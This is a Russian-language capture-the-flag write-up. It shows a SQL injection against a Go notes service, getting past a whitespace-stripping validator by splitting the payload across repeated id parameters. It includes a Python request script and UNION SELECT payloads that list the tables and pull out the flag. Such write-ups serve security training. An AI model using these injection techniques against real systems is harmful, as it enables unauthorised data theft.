# More and more

Открыв код приложения видим:

1. есть обработчик `/get-by-id`
2. в нём функция валидирует параметры запроса и примитивным образом вставляет резултат в sql запрос. 
```
id := strings.Join(validate(r.URL.Query()["id"]), " ")
query := fmt.Sprintf("SELECT note FROM notes WHERE id = %s", id)
rows, err := pg.Query(context.Background(), query)
```
```
func validate(words []string) (res []string) {
	for _, w := range words {
		w = strings.ReplaceAll(w, "\n", "")
		w = strings.ReplaceAll(w, " ", "")
		w = strings.ReplaceAll(w, "\r", "")
		...
		w = strings.ReplaceAll(w, "%0C", "")
		w = strings.ReplaceAll(w, "%0c", "")
		w = strings.ReplaceAll(w, "%0D", "")
		w = strings.ReplaceAll(w, "%0d", "")

		res = append(res, w)
	}
	return
}
```
3. из параметры ссылки берутся все ключ `id=`, после чего значения соеденяются пробелами
4. так как в функции валидации удаляются проблелы, все нужные слова для sql инъекции будем писать в значении ключей `key=`
5. создаём программу для удобства создания запросов. Пробуем `1 UNION SELECT table_name FROM information_schema.tables` чтобы соеденить таблицы заметок и таблицу с именами таблиц
```
import requests

def get_token():
    text = "1 UNION SELECT table_name FROM information_schema.tables"
    text_list = text.split(" ")
    params = [f"id={text_list[i]}" for i in range(len(text_list))]
    url = "http://more-and-more.tasks.2025.ctf.cs.msu.ru/get-by-id?" + "&".join(params)
    response = requests.get(url)

    if "error" not in response.text:
        for i in response.json():
            print(i)
    else:
        print(response.text)

get_token()
```
6. видим в списке таблицу с именем flag. поменяем запрос на `text = "1 UNION SELECT flag FROM flag"`
7. видим в списке флаг вместе с заметкой, копируем флаг и получаем баллы
